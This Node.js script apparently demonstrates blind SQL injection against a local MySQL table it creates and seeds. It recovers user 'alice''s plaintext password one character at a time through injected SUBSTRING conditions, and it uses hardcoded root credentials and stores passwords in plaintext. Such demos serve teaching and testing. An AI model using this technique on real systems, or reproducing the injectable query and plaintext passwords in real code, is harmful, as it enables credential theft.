import mysql from 'mysql2/promise';

const targetUser = 'alice';
const maxPasswordLength = 20;
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789'; // add symbols if needed

const connection = await mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'root',
  database: 'test'
});

// Ensure the table and data exist
await connection.execute(`
  CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(255),
    password VARCHAR(255)
  )
`);

const [rows] = await connection.execute(`SELECT COUNT(*) AS count FROM users`);
if (rows[0].count === 0) {
  await connection.execute(`
    INSERT INTO users (name, password) VALUES ('alice', 'apple123'), ('bob', 'banana456')
  `);
}

let discoveredPassword = '';

for (let position = 1; position <= maxPasswordLength; position++) {
  let foundChar = null;

  for (const char of charset) {
    const injection = `${targetUser}' AND SUBSTRING(password, ${position}, 1) = '${char}' -- `;
    const query = `SELECT * FROM users WHERE name = '${injection}'`;

    const [results] = await connection.query(query);

    if (results.length > 0) {
      discoveredPassword += char;
      console.log(`Position ${position}: '${char}' ✅`);
      foundChar = char;
      break;
    }
  }

  if (!foundChar) {
    console.log(`No match at position ${position}. Assuming end of password.`);
    break;
  }
}

await connection.end();

console.log(`\n🔓 Discovered password for '${targetUser}': ${discoveredPassword}`);
